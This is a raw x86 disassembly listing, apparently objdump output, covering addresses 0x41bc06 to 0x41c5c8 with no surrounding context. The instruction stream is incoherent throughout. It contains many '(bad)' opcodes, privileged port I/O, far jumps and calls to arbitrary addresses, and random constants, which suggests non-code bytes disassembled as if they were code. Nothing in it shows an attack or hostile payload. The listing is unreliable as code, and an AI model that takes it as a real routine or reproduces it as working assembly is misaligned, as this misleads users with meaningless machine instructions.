  41bc06:	mov    fs,WORD PTR [ebx+0x15c2993a]
  41bc0c:	stos   BYTE PTR es:[edi],al
  41bc0d:	lods   al,BYTE PTR ds:[esi]
  41bc0e:	mov    edi,0x20f1a9d1
  41bc13:	jns    0x41bc7e
  41bc15:	sbb    dl,BYTE PTR [eax-0x35041569]
  41bc1b:	das    
  41bc1c:	cmp    eax,0xd500e20
  41bc21:	inc    esi
  41bc22:	into   
  41bc23:	jmp    0x41bc65
  41bc25:	xchg   esi,eax
  41bc26:	adc    DWORD PTR [edx-0x3b],edi
  41bc29:	(bad)  
  41bc2b:	mov    dh,0x63
  41bc2d:	jae    0x41bc0f
  41bc2f:	xchg   edi,eax
  41bc30:	sub    BYTE PTR [eax+0x3f],bh
  41bc33:	out    dx,eax
  41bc34:	in     al,dx
  41bc35:	into   
  41bc36:	pop    esi
  41bc37:	adc    cl,dl
  41bc39:	shl    ah,1
  41bc3b:	push   ebx
  41bc3c:	ins    DWORD PTR es:[edi],dx
  41bc3d:	out    0xa1,al
  41bc3f:	jo     0x41bc02
  41bc41:	nop
  41bc42:	add    DWORD PTR [edi],0x0
  41bc45:	sub    DWORD PTR ds:0xcea637be,ebp
  41bc4b:	stos   BYTE PTR es:[edi],al
  41bc4c:	push   ss
  41bc4d:	mov    ebp,0x1962b550
  41bc52:	fcomp  QWORD PTR [esi-0x56]
  41bc55:	xor    al,0x16
  41bc57:	cmp    DWORD PTR [edi-0x20],ecx
  41bc5a:	push   esi
  41bc5b:	enter  0xb40a,0xbd
  41bc5f:	sub    eax,0xd80bdcae
  41bc64:	ficomp WORD PTR [ebx+0x66]
  41bc67:	sub    cl,BYTE PTR [edi+edx*1-0x40b2f8a8]
  41bc6e:	mov    bh,0x14
  41bc70:	ds mov ch,0x7e
  41bc73:	lds    edx,FWORD PTR [ebx-0x4586fb86]
  41bc79:	cs xchg ecx,eax
  41bc7b:	push   edx
  41bc7c:	push   es
  41bc7d:	xchg   esp,esp
  41bc7f:	inc    esp
  41bc80:	rol    DWORD PTR [eax],cl
  41bc82:	mov    ds:0x4dd374d,al
  41bc87:	pop    edi
  41bc88:	int3   
  41bc89:	addr16 aaa 
  41bc8b:	jle    0x41bc78
  41bc8d:	add    eax,0x744c523f
  41bc92:	xchg   ebx,eax
  41bc93:	xchg   edi,eax
  41bc94:	inc    ebp
  41bc95:	imul   esp,DWORD PTR ds:0xf570ce36,0x7e844165
  41bc9f:	call   0x83097bc3
  41bca4:	pop    ds
  41bca5:	mov    dl,0x6c
  41bca7:	sub    dl,BYTE PTR [esi-0x6c]
  41bcaa:	add    dh,BYTE PTR [edi+0x1b]
  41bcad:	jmp    0x788:0xa041c62d
  41bcb4:	pop    ebx
  41bcb5:	adc    al,0x9a
  41bcb7:	clc    
  41bcb8:	aad    0x85
  41bcba:	mov    bl,0xd6
  41bcbc:	stos   BYTE PTR es:[edi],al
  41bcbd:	push   cs
  41bcbe:	mov    ecx,0x2840fc9
  41bcc3:	and    bh,BYTE PTR [edx+0x691f1f61]
  41bcc9:	neg    BYTE PTR fs:[eax+0x31ddb0f1]
  41bcd0:	push   ebp
  41bcd1:	push   ss
  41bcd2:	rol    esp,cl
  41bcd4:	fwait
  41bcd5:	in     eax,0xab
  41bcd7:	push   0x30
  41bcd9:	in     eax,0x16
  41bcdb:	add    al,0xdf
  41bcdd:	mov    ebx,0x3aea17eb
  41bce2:	push   ebx
  41bce3:	imul   DWORD PTR [esi]
  41bce5:	jno    0x41bc7a
  41bce7:	sbb    BYTE PTR [ebp+0x3fb40aa1],ch
	...
  41bd55:	add    dl,dl
  41bd57:	xor    bh,dl
  41bd59:	clc    
  41bd5a:	cli    
  41bd5b:	clc    
  41bd5c:	sar    BYTE PTR [edx],cl
  41bd5e:	sti    
  41bd5f:	mov    ebp,0x2a94d9d8
  41bd64:	jb     0x41bd10
  41bd66:	adc    ebp,DWORD PTR [ebx]
  41bd68:	add    DWORD PTR [eax],eax
  41bd6a:	inc    DWORD PTR [eax]
  41bd6c:	add    BYTE PTR [eax],al
  41bd6e:	in     eax,dx
  41bd6f:	or     dh,BYTE PTR [ecx+0x1f]
  41bd72:	aas    
  41bd73:	je     0x41bcf6
  41bd75:	jmp    0x7ad6b84b
  41bd7a:	mov    ds,edi
  41bd7c:	(bad)  
  41bd7d:	hlt    
  41bd7e:	push   0xffffffa1
  41bd80:	mov    ch,0x92
  41bd82:	retf   
  41bd83:	or     eax,0x77399c81
  41bd88:	(bad)  
  41bd89:	pop    DWORD PTR [ecx-0x68809577]
  41bd8f:	data16 jmp 0x41bd1b
  41bd92:	mov    al,ds:0x7ac3c60f
  41bd97:	daa    
  41bd98:	(bad)  
  41bd9a:	cmp    DWORD PTR [eax],ebx
  41bd9c:	fcomp  QWORD PTR [ebp+0x49027416]
  41bda2:	push   ecx
  41bda3:	dec    ebp
  41bda4:	and    eax,0xff097001
  41bda9:	jne    0x41be0f
  41bdab:	sub    edx,DWORD PTR [eax-0x1d514406]
  41bdb1:	pop    edi
  41bdb2:	mov    edx,0x2ff0585a
  41bdb7:	lahf   
  41bdb8:	push   edx
  41bdb9:	pop    ss
  41bdba:	loope  0x41bd4a
  41bdbc:	fidivr WORD PTR [ebp+ecx*8-0x7157f1a3]
  41bdc3:	mov    ah,0x71
  41bdc5:	jmp    0x41bd85
  41bdc7:	push   ebp
  41bdc8:	dec    esi
  41bdc9:	push   esp
  41bdca:	je     0x41bdee
  41bdcc:	push   0x3a
  41bdce:	mov    ds:0x3862bef2,al
  41bdd3:	sbb    ebx,eax
  41bdd5:	mov    WORD PTR [ecx*1-0x2eee31ee],?
  41bddc:	iret   
  41bddd:	es sbb dh,cl
  41bde0:	mov    ecx,0x915ce962
  41bde5:	in     al,dx
  41bde6:	and    eax,0x1f61a6ab
  41bdeb:	push   esp
  41bdec:	jbe    0x41be29
  41bdee:	imul   esi,DWORD PTR [esi-0x1c],0x3ed4aaf3
  41bdf5:	pop    ds
  41bdf6:	jne    0x41be18
  41bdf8:	adc    al,0xe4
  41bdfa:	cmp    DWORD PTR [ecx],edx
  41bdfc:	cmova  ebx,DWORD PTR ds:0x85d67c37
  41be03:	rol    ah,1
  41be05:	and    cl,ah
  41be07:	inc    edx
  41be08:	ret    
  41be09:	sub    eax,0x9b59a373
  41be0e:	(bad)  
  41be0f:	leave  
  41be10:	int    0xb5
  41be12:	int3   
  41be13:	adc    DWORD PTR cs:[ecx],ebx
  41be16:	or     BYTE PTR [eax],al
  41be18:	mov    esi,0xc7c7c201
  41be1e:	dec    edx
  41be1f:	add    BYTE PTR [eax+ebx*1+0x52410379],0x7b
  41be27:	xchg   DWORD PTR [ebp+0x21],ebp
  41be2a:	(bad)  
  41be2b:	out    dx,al
  41be2c:	cmp    DWORD PTR [edx],ebp
  41be2e:	jne    0x41be4f
  41be30:	push   0x33
  41be32:	sub    bh,bl
  41be34:	push   0x425c66e7
  41be39:	test   al,0x3e
  41be3b:	aam    0x8d
  41be3d:	cld    
  41be3e:	adc    DWORD PTR [edi],ecx
  41be40:	inc    ecx
  41be41:	inc    ebp
  41be42:	shr    DWORD PTR [eax],0x65
  41be45:	out    0x44,eax
  41be47:	fsubp  st(0),st
  41be49:	and    ecx,DWORD PTR es:[edx-0x3f]
  41be4d:	and    bh,dl
  41be4f:	push   ebp
  41be50:	jnp    0x41be7f
  41be52:	sahf   
  41be53:	xchg   esp,eax
  41be54:	inc    edx
  41be55:	fild   DWORD PTR [edi+eiz*1-0x1a15a404]
  41be5c:	cld    
  41be5d:	imul   esp,DWORD PTR [edi-0x6b],0xffffffbd
  41be61:	add    dh,BYTE PTR [ecx+0x7]
  41be64:	ret    0xe18a
  41be67:	jl     0x41be8c
  41be69:	mov    esp,0x799af8
	...
  41bed6:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41bedc:	imul   edi
  41bede:	mov    ebp,DWORD PTR [ecx-0xd86c09a]
  41bee4:	test   BYTE PTR [esi+0x12],ah
  41bee7:	sub    al,0x1
  41bee9:	add    bh,bh
  41beeb:	add    BYTE PTR [eax],al
  41beed:	add    BYTE PTR [ebp+0x3f],bl
  41bef0:	sbb    eax,0xbad663ad
  41bef5:	lds    esi,FWORD PTR [ebp+0x468da058]
  41befb:	push   ebp
  41befc:	pop    ds
  41befd:	das    
  41befe:	data16 je 0x41bee0
  41bf01:	push   ds
  41bf02:	das    
  41bf03:	stos   DWORD PTR es:[edi],eax
  41bf04:	fwait
  41bf05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf06:	cmc    
  41bf07:	or     al,0xff
  41bf09:	cmp    al,BYTE PTR [esi+eax*2-0x7b]
  41bf0d:	adc    BYTE PTR [esi+0x3f],dl
  41bf10:	jne    0x41bf1c
  41bf12:	ds jns 0x41bf74
  41bf15:	ror    DWORD PTR gs:[edi],1
  41bf18:	dec    esp
  41bf19:	cmp    ebp,DWORD PTR [eax-0x70]
  41bf1c:	adc    ecx,DWORD PTR [ebx+eax*8]
  41bf1f:	sbb    eax,0xd05ddecb
  41bf24:	jbe    0x41bf77
  41bf26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf27:	fstp   st(7)
  41bf29:	ret    0xb12c
  41bf2c:	rol    al,1
  41bf2e:	ret    
  41bf2f:	xchg   ebx,eax
  41bf30:	das    
  41bf31:	mov    esi,0x43dca742
  41bf36:	push   eax
  41bf37:	inc    esp
  41bf38:	jnp    0x41bf59
  41bf3a:	jl     0x41bf05
  41bf3c:	(bad)  [ebx+0x12]
  41bf3f:	mov    fs,ebp
  41bf41:	add    ch,dl
  41bf43:	sbb    DWORD PTR [ecx],esi
  41bf45:	xlat   BYTE PTR ds:[ebx]
  41bf46:	mov    DWORD PTR [edi],0x89520b17
  41bf4c:	repz sbb eax,0xe479982a
  41bf52:	(bad)  
  41bf53:	pop    ss
  41bf54:	sub    eax,0xe88dd7dc
  41bf59:	outs   dx,DWORD PTR ds:[esi]
  41bf5a:	mov    ch,0xe8
  41bf5c:	cmp    al,0x4c
  41bf5e:	out    dx,eax
  41bf5f:	mov    bh,0x57
  41bf61:	retf   0x550c
  41bf64:	mov    edx,DWORD PTR [ebp+0x2fe99c17]
  41bf6a:	lods   eax,DWORD PTR ds:[esi]
  41bf6b:	and    al,0x5e
  41bf6d:	stos   DWORD PTR es:[edi],eax
  41bf6e:	rcr    edx,cl
  41bf70:	ins    BYTE PTR es:[edi],dx
  41bf71:	push   ds
  41bf72:	or     al,0x8b
  41bf74:	dec    edx
  41bf75:	push   esp
  41bf76:	mov    cl,BYTE PTR [ebx+0x6dec871]
  41bf7c:	cmp    al,0x2
  41bf7e:	sar    DWORD PTR [ecx],1
  41bf80:	lods   eax,DWORD PTR ds:[esi]
  41bf81:	ins    DWORD PTR es:[edi],dx
  41bf82:	das    
  41bf83:	das    
  41bf84:	in     eax,dx
  41bf85:	push   ecx
  41bf86:	outs   dx,DWORD PTR ds:[esi]
  41bf87:	loope  0x41bfca
  41bf89:	push   eax
  41bf8a:	aas    
  41bf8b:	and    esi,ebp
  41bf8d:	mov    cl,0xf4
  41bf8f:	cdq    
  41bf90:	mov    ah,0x5c
  41bf92:	push   eax
  41bf93:	ds in  al,dx
  41bf95:	dec    esi
  41bf96:	pusha  
  41bf97:	leave  
  41bf98:	retf   
  41bf99:	outs   dx,DWORD PTR ds:[esi]
  41bf9a:	adc    eax,0x381a3aa8
  41bf9f:	daa    
  41bfa0:	popf   
  41bfa1:	fstp   st(3)
  41bfa3:	aad    0x6f
  41bfa5:	or     dl,BYTE PTR gs:[ecx]
  41bfa8:	test   ch,ah
  41bfaa:	ret    0xd6ac
  41bfad:	pop    esi
  41bfae:	jno    0x41bfc9
  41bfb0:	out    0x13,al
  41bfb2:	sub    eax,0xa8937aba
  41bfb7:	adc    ch,BYTE PTR [ecx]
  41bfb9:	xor    eax,0x74caaadd
  41bfbe:	jecxz  0x41bf60
  41bfc0:	mov    al,0x6f
  41bfc2:	loope  0x41bfbd
  41bfc4:	push   esi
  41bfc5:	pop    esp
  41bfc6:	fdiv   QWORD PTR [ebp+0x3b]
  41bfc9:	(bad)  
  41bfca:	in     eax,0x2f
  41bfcc:	jecxz  0x41c013
  41bfce:	xor    eax,ecx
  41bfd0:	pop    es
  41bfd1:	mov    esi,?
  41bfd3:	cdq    
  41bfd4:	adc    al,0x69
  41bfd6:	jmp    0x3d475eb4
  41bfdb:	push   ebx
  41bfdc:	bound  esi,QWORD PTR [edi+0x141683ef]
  41bfe2:	mov    cl,BYTE PTR [edx-0x40]
  41bfe5:	push   edx
  41bfe6:	jmp    0x7555fecf
  41bfeb:	sub    BYTE PTR [esi+0x0],bl
	...
  41c056:	fs jae 0x41c08c
  41c059:	es aaa 
  41c05b:	data16 jne 0x41c0d1
  41c05e:	ins    BYTE PTR es:[edi],dx
  41c05f:	daa    
  41c060:	mov    cl,0xc1
  41c062:	sub    DWORD PTR [ebx],esp
  41c064:	cwde   
  41c065:	mov    al,0x11
  41c067:	sub    eax,0xff0001
  41c06c:	add    BYTE PTR [eax],al
  41c06e:	loopne 0x41c074
  41c070:	jb     0x41c024
  41c072:	inc    ebp
  41c073:	daa    
  41c074:	out    0x31,eax
  41c076:	mov    edx,0x714ca6a9
  41c07b:	(bad)  
  41c07c:	lock das 
  41c07e:	stc    
  41c07f:	outs   dx,DWORD PTR ds:[esi]
  41c080:	sbb    dl,BYTE PTR [ebx+0x3f6e875f]
  41c086:	adc    al,0xd7
  41c088:	jno    0x41c0c0
  41c08a:	ins    DWORD PTR es:[edi],dx
  41c08b:	mov    al,BYTE PTR [ecx+ebx*8+0x32]
  41c08f:	ins    BYTE PTR es:[edi],dx
  41c090:	rcl    edx,0xa4
  41c093:	(bad)  
  41c094:	cmp    DWORD PTR [eax],esi
  41c096:	cli    
  41c097:	cmp    eax,0x6ada94b8
  41c09c:	cs repz sbb dl,al
  41c0a0:	ret    
  41c0a1:	push   ds
  41c0a2:	fwait
  41c0a3:	sbb    DWORD PTR [ebp+0x3603a01],ecx
  41c0a9:	xchg   ebx,eax
  41c0aa:	hlt    
  41c0ab:	sub    dh,dl
  41c0ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0ae:	mov    ebp,DWORD PTR [ebp+0x47]
  41c0b1:	loope  0x41c0fd
  41c0b3:	or     dh,BYTE PTR [esi]
  41c0b5:	sti    
  41c0b6:	nop
  41c0b7:	adc    eax,0xb51b7bb4
  41c0bc:	cmp    BYTE PTR [ecx-0x7d011968],cl
  41c0c2:	mov    ebx,0xb2aab354
  41c0c7:	mov    ebx,0x3039d366
  41c0cc:	sbb    BYTE PTR [ebx],cl
  41c0ce:	aam    0x70
  41c0d0:	mov    eax,0xb7d8be2f
  41c0d5:	in     al,dx
  41c0d6:	(bad)  
  41c0d7:	sti    
  41c0d8:	xchg   BYTE PTR ds:0xc5253844,bh
  41c0de:	mov    esp,0xf01f789a
  41c0e3:	pop    edx
  41c0e4:	xor    al,0xdf
  41c0e6:	xchg   ecx,eax
  41c0e7:	push   ebp
  41c0e8:	jnp    0x41c094
  41c0ea:	out    0x54,eax
  41c0ec:	movnti DWORD PTR [eax-0x64102285],esp
  41c0f3:	xor    al,ah
  41c0f5:	mov    dh,cl
  41c0f7:	adc    ebx,edx
  41c0f9:	test   eax,0xc0fb9825
  41c0fe:	ja     0x41c16c
  41c100:	les    eax,FWORD PTR [edi-0x55]
  41c103:	mov    WORD PTR [ebp+0x7fc1a469],gs
  41c109:	ss dec ecx
  41c10b:	imul   eax
  41c10d:	in     al,dx
  41c10e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c10f:	sbb    BYTE PTR [ebx+ebp*4-0x5929830c],cl
  41c116:	and    cl,BYTE PTR [eax+0x6638e740]
  41c11c:	sar    DWORD PTR [ebx-0x10],cl
  41c11f:	scas   eax,DWORD PTR es:[edi]
  41c120:	push   ecx
  41c121:	in     al,dx
  41c122:	jns    0x41c158
  41c124:	mov    bh,0x7c
  41c126:	outs   dx,DWORD PTR ds:[esi]
  41c127:	dec    edx
  41c128:	dec    ecx
  41c129:	loopne 0x41c0f1
  41c12b:	mov    ah,0xd9
  41c12d:	dec    ebx
  41c12e:	arpl   di,ax
  41c130:	inc    esp
  41c131:	push   0x47
  41c133:	mov    esp,DWORD PTR ds:0xf8ccc82e
  41c139:	cmp    DWORD PTR [esi+ecx*1],edx
  41c13c:	jmp    FWORD PTR [eax]
  41c13e:	sub    edi,DWORD PTR [edi+0x22368bd2]
  41c144:	pop    esp
  41c145:	std    
  41c146:	add    eax,0xf8bde85d
  41c14b:	inc    eax
  41c14c:	ins    BYTE PTR es:[edi],dx
  41c14d:	rcr    BYTE PTR [eax-0x61d6657f],0x4d
  41c154:	jno    0x41c1cc
  41c156:	sub    BYTE PTR [edi],al
  41c158:	push   cs
  41c159:	cmovno edi,ecx
  41c15c:	xchg   ebx,eax
  41c15d:	pop    ebx
  41c15e:	push   es
  41c15f:	dec    esi
  41c160:	in     al,0x6f
  41c162:	adc    eax,0x136c6a
  41c167:	out    0xd2,eax
  41c169:	xchg   edx,eax
  41c16a:	popa   
  41c16b:	scas   al,BYTE PTR es:[edi]
  41c16c:	retf   0x0
	...
  41c1d3:	add    BYTE PTR [eax],al
  41c1d5:	add    cl,bl
  41c1d7:	dec    edx
  41c1d8:	mov    eax,ds:0xd9fbb3f8
  41c1dd:	imul   edi,DWORD PTR ds:0xcae90501,0x58
  41c1e4:	fistp  QWORD PTR [ecx]
  41c1e6:	adc    BYTE PTR [esi],ch
  41c1e8:	add    DWORD PTR [eax],eax
  41c1ea:	inc    DWORD PTR [eax]
  41c1ec:	add    BYTE PTR [eax],al
  41c1ee:	sbb    DWORD PTR [ebp+0x48],esi
  41c1f1:	fwait
  41c1f2:	dec    edx
  41c1f3:	iret   
  41c1f4:	fdiv   QWORD PTR ds:0x8f284707
  41c1fa:	cld    
  41c1fb:	ins    BYTE PTR es:[edi],dx
  41c1fc:	and    bl,BYTE PTR ds:0xc80abd40
  41c202:	js     0x41c203
  41c204:	cmp    al,0x33
  41c206:	and    eax,0xe3228ec0
  41c20b:	xchg   BYTE PTR [edx],ch
  41c20d:	push   edi
  41c20e:	retf   0xfe4d
  41c211:	fcomp  DWORD PTR [edi]
  41c213:	pop    es
  41c214:	aam    0xad
  41c216:	stc    
  41c217:	stos   BYTE PTR es:[edi],al
  41c218:	sbb    esi,DWORD PTR [eax]
  41c21a:	jb     0x41c23b
  41c21c:	push   eax
  41c21d:	gs dec esp
  41c21f:	cmc    
  41c220:	sub    eax,0x3b774af8
  41c225:	aam    0xaa
  41c227:	mov    eax,ds:0xb350789
  41c22c:	sbb    eax,0x5ddfc384
  41c231:	test   ah,0xa4
  41c234:	mov    ebp,0xb2d96346
  41c239:	bnd jmp 0xc000601c
  41c23f:	dec    esi
  41c240:	add    cl,BYTE PTR [eax]
  41c242:	(bad)  
  41c243:	out    0xb8,al
  41c245:	pop    eax
  41c246:	fs loope 0x41c228
  41c249:	rcl    ebx,0x5a
  41c24c:	push   edx
  41c24d:	sub    ebp,DWORD PTR [edx+0x36]
  41c250:	mov    al,0xc2
  41c252:	stos   BYTE PTR es:[edi],al
  41c253:	sbb    ch,BYTE PTR [edx+0x92458c5]
  41c259:	adc    BYTE PTR [ebx],0x67
  41c25c:	mov    ch,ah
  41c25e:	repnz add cl,BYTE PTR ds:0x2f0ac2c9
  41c266:	add    eax,0x630f9367
  41c26b:	push   0xffffff81
  41c26d:	jbe    0x41c2b8
  41c26f:	test   eax,0x32eaf1b5
  41c274:	mov    cl,0x37
  41c276:	lahf   
  41c277:	cld    
  41c278:	aas    
  41c279:	xor    bl,BYTE PTR [esi+0x6c]
  41c27c:	push   ebp
  41c27d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c27e:	add    BYTE PTR [esi+0x1224dfe],cl
  41c284:	dec    esp
  41c285:	int    0xb7
  41c287:	loope  0x41c26c
  41c289:	mov    cs,esi
  41c28b:	ja     0x41c2f8
  41c28d:	jnp    0x41c263
  41c28f:	jmp    0x1a7b:0x3deab4f5
  41c296:	pusha  
  41c297:	test   BYTE PTR [esp+edi*1],ah
  41c29a:	fs cli 
  41c29c:	mov    al,ds:0x14a8b54b
  41c2a1:	in     al,0x2b
  41c2a3:	mov    esp,0xa761f224
  41c2a8:	pushf  
  41c2a9:	push   cs
  41c2aa:	push   es
  41c2ab:	xor    BYTE PTR [ebx+ebx*2+0x59],al
  41c2af:	cmp    ebp,eax
  41c2b1:	iret   
  41c2b2:	sub    cl,ch
  41c2b4:	(bad)  
  41c2b5:	xchg   ebx,eax
  41c2b6:	xchg   bh,bh
  41c2b8:	dec    edi
  41c2b9:	mov    edi,0x83b812e1
  41c2be:	aas    
  41c2bf:	mov    edi,0x33e463bf
  41c2c4:	inc    ebp
  41c2c5:	int    0x6
  41c2c7:	call   0xfa9a:0x4b7b8ecc
  41c2ce:	mov    bh,0x16
  41c2d0:	dec    edi
  41c2d1:	dec    esi
  41c2d2:	(bad)  [ebx-0x37122b6b]
  41c2d8:	lods   eax,DWORD PTR ds:[esi]
  41c2d9:	xor    cl,BYTE PTR [eax-0x6a6daa85]
  41c2df:	xchg   esi,eax
  41c2e0:	je     0x41c280
  41c2e2:	ret    0x77a7
  41c2e5:	xor    BYTE PTR [ecx-0x51],ch
  41c2e8:	mov    ecx,0xd8d3c139
	...
  41c355:	add    bl,dh
  41c357:	and    ebp,ecx
  41c359:	push   ebp
  41c35a:	(bad)  
  41c35c:	sti    
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	enter  0x1a95,0x14
  41c362:	scas   al,BYTE PTR es:[edi]
  41c363:	jecxz  0x41c2f6
  41c365:	xchg   BYTE PTR [edi],cl
  41c367:	das    
  41c368:	add    DWORD PTR [eax],eax
  41c36a:	inc    DWORD PTR [eax]
  41c36c:	add    BYTE PTR [eax],al
  41c36e:	sbb    BYTE PTR [esi+0x50fc8a83],ah
  41c374:	out    dx,al
  41c375:	mov    edx,0xf832a8bb
  41c37a:	or     al,0xda
  41c37c:	ret    0xac22
  41c37f:	fmul   st,st(0)
  41c381:	jmp    0x6b20dc6a
  41c386:	popf   
  41c387:	pop    edi
  41c388:	fild   WORD PTR [eax]
  41c38a:	cli    
  41c38b:	and    BYTE PTR [edx-0x4e],dl
  41c38e:	je     0x41c37f
  41c390:	repz shr edi,0xa
  41c394:	(bad)  
  41c395:	stos   BYTE PTR es:[edi],al
  41c396:	sahf   
  41c397:	sbb    BYTE PTR [edx+0x510be9c3],al
  41c39d:	inc    edx
  41c39e:	sub    cl,BYTE PTR [ebp+0x53]
  41c3a1:	cmp    eax,0xbd7086fb
  41c3a6:	cmp    al,0x7c
  41c3a8:	pop    edi
  41c3a9:	clc    
  41c3aa:	(bad)  
  41c3ab:	lea    edx,[edi]
  41c3ad:	sub    al,0x3a
  41c3af:	jp     0x41c404
  41c3b1:	push   ebx
  41c3b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3b3:	adc    BYTE PTR [eax],0xac
  41c3b6:	daa    
  41c3b7:	push   ebp
  41c3b8:	and    ch,bh
  41c3ba:	xor    al,0xfe
  41c3bc:	xchg   edi,eax
  41c3bd:	std    
  41c3be:	dec    edx
  41c3bf:	ficom  DWORD PTR [esi]
  41c3c1:	mov    ah,0xf1
  41c3c3:	inc    ebx
  41c3c4:	test   BYTE PTR ds:0xd1015e38,cl
  41c3ca:	sbb    ebx,DWORD PTR [edi+0x60]
  41c3cd:	mov    ?,WORD PTR [ebx-0x74]
  41c3d0:	push   ds
  41c3d1:	sbb    BYTE PTR ds:0x747de065,ah
  41c3d7:	or     ebx,ebp
  41c3d9:	add    eax,0x7bd52c41
  41c3de:	imul   ebp
  41c3e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3e1:	jbe    0x41c433
  41c3e3:	adc    eax,0x4e670e7b
  41c3e8:	mov    cl,0x2d
  41c3ea:	cli    
  41c3eb:	push   ecx
  41c3ec:	retf   0x6f08
  41c3ef:	addr16 dec edi
  41c3f1:	cmp    ch,BYTE PTR [esi-0x749f762c]
  41c3f7:	(bad)  
  41c3f8:	rcl    cl,cl
  41c3fa:	pusha  
  41c3fb:	(bad)  
  41c3fd:	addr16 (bad) 
  41c3ff:	fisub  WORD PTR [edi-0x3]
  41c402:	inc    ebx
  41c403:	or     eax,0x68351794
  41c408:	arpl   WORD PTR [ebx-0x3926d04c],cx
  41c40e:	cmp    al,0x12
  41c410:	xor    cl,0x6d
  41c413:	mov    bl,0x35
  41c415:	sbb    eax,ebx
  41c417:	sbb    al,0x6
  41c419:	adc    esi,ebx
  41c41b:	push   ebx
  41c41c:	jmp    0x22d5:0x17bd665e
  41c423:	dec    ecx
  41c424:	mov    ah,0xbd
  41c426:	push   DWORD PTR es:[edx+0x79]
  41c42a:	sub    dh,dl
  41c42c:	push   0x4c
  41c42e:	push   esp
  41c42f:	sbb    eax,0x16d6fc8b
  41c434:	leave  
  41c435:	in     al,dx
  41c436:	out    dx,eax
  41c437:	cmp    al,0x6b
  41c439:	jae    0x41c3e7
  41c43b:	sub    eax,0xb4718f58
  41c440:	popa   
  41c441:	sbb    BYTE PTR [edx],al
  41c443:	adc    al,0x58
  41c445:	pop    esp
  41c446:	loope  0x41c46a
  41c448:	scas   al,BYTE PTR es:[edi]
  41c449:	dec    ecx
  41c44a:	mov    esi,0x3d15bef0
  41c44f:	jnp    0x41c449
  41c451:	mov    ebp,0x7ebf2bc4
  41c456:	cmp    dl,cl
  41c458:	xchg   esp,eax
  41c459:	nop
  41c45a:	inc    ebx
  41c45b:	fstp   st(2)
  41c45d:	xchg   BYTE PTR [ebx+0x3d],bl
  41c460:	pop    ss
  41c461:	imul   DWORD PTR [ebx+esi*2-0xd]
  41c465:	dec    ecx
  41c466:	push   edi
  41c467:	mov    edx,ss
  41c469:	push   cs
  41c46a:	push   es
  41c46b:	sub    al,0xd9
	...
  41c4d5:	add    BYTE PTR [ebx+0x20],dl
  41c4d8:	mov    al,ds:0x5faef3ae
  41c4dd:	std    
  41c4de:	mov    bl,0x35
  41c4e0:	dec    ebp
  41c4e1:	push   ecx
  41c4e2:	add    al,0xcc
  41c4e4:	lea    cx,[esi]
  41c4e7:	xor    BYTE PTR [ecx],al
  41c4e9:	add    bh,bh
  41c4eb:	add    BYTE PTR [eax],al
  41c4ed:	add    dh,bl
  41c4ef:	mov    ds:0x927a839f,al
  41c4f4:	test   BYTE PTR [ecx],0x16
  41c4f7:	add    eax,0xbda1c9a0
  41c4fc:	stos   BYTE PTR es:[edi],al
  41c4fd:	mov    dl,0x1b
  41c4ff:	test   al,0x71
  41c501:	or     DWORD PTR [esi-0x7e],ebp
  41c504:	sbb    eax,0xc11017e8
  41c509:	pusha  
  41c50a:	sar    BYTE PTR [ebx],1
  41c50c:	fadd   DWORD PTR ds:0xb8778e3a
  41c512:	inc    edx
  41c513:	ficom  DWORD PTR [esi-0x79]
  41c516:	dec    esi
  41c517:	and    al,0x81
  41c519:	cmp    eax,0x26c2f48d
  41c51e:	push   ebp
  41c51f:	dec    esp
  41c520:	arpl   WORD PTR [eax-0x9],di
  41c523:	iret   
  41c524:	or     al,0x7e
  41c526:	inc    eax
  41c527:	inc    ebp
  41c528:	jmp    0x41c4f8
  41c52a:	cs cwde 
  41c52c:	ret    0xb5cb
  41c52f:	pop    ebp
  41c530:	xor    DWORD PTR [esi+0x69],0xffffffef
  41c534:	fiadd  DWORD PTR ds:0xe8f552d3
  41c53a:	mov    ah,0xf
  41c53c:	arpl   WORD PTR [ebp+0x5b],si
  41c53f:	lahf   
  41c540:	retf   
  41c541:	imul   ebx,edi,0xa98bc912
  41c547:	push   0x19
  41c549:	adc    BYTE PTR [ebx+0x7d658dac],bh
  41c54f:	call   0x7be3cd0c
  41c554:	cdq    
  41c555:	inc    ebx
  41c556:	ja     0x41c552
  41c558:	ret    
  41c559:	fild   QWORD PTR [edi+0x6c]
  41c55c:	stos   BYTE PTR es:[edi],al
  41c55d:	mov    WORD PTR [ebp-0x6f04be8b],ss
  41c563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c564:	or     dl,BYTE PTR [ebx-0x23]
  41c567:	sub    al,0xf8
  41c569:	fcomp  st(4)
  41c56b:	push   0x11
  41c56d:	xchg   BYTE PTR ds:0x6cc00673,ah
  41c573:	or     DWORD PTR [eax-0x7c],esi
  41c576:	and    eax,0x346d1d71
  41c57b:	sbb    bh,ah
  41c57d:	js     0x41c523
  41c57f:	repz fs mov ah,0xd
  41c583:	sti    
  41c584:	stc    
  41c585:	fwait
  41c586:	add    DWORD PTR [ebx+0xc],esi
  41c589:	and    eax,0xea2df0bb
  41c58e:	jg     0x41c5a4
  41c590:	mov    bl,0xf1
  41c592:	jmp    FWORD PTR [edi]
  41c594:	adc    eax,0x1d01aa94
  41c599:	ret    
  41c59a:	loopne 0x41c608
  41c59c:	js     0x41c616
  41c59e:	(bad)  
  41c59f:	cs icebp 
  41c5a1:	aaa    
  41c5a2:	and    DWORD PTR [edi],esp
  41c5a4:	xlat   BYTE PTR ds:[ebx]
  41c5a5:	sbb    al,0xa7
  41c5a7:	jae    0x41c605
  41c5a9:	or     eax,0x6c4a69a1
  41c5ae:	in     eax,0x26
  41c5b0:	les    esi,FWORD PTR [edi-0x6c2a825]
  41c5b6:	cmp    eax,0x9799ac44
  41c5bb:	scas   eax,DWORD PTR es:[edi]
  41c5bc:	scas   eax,DWORD PTR es:[edi]
  41c5bd:	add    ebx,edx
  41c5bf:	lahf   
  41c5c0:	add    eax,0x430ed708
  41c5c5:	sar    BYTE PTR [ecx+esi*1],cl
  41c5c8:	fwait
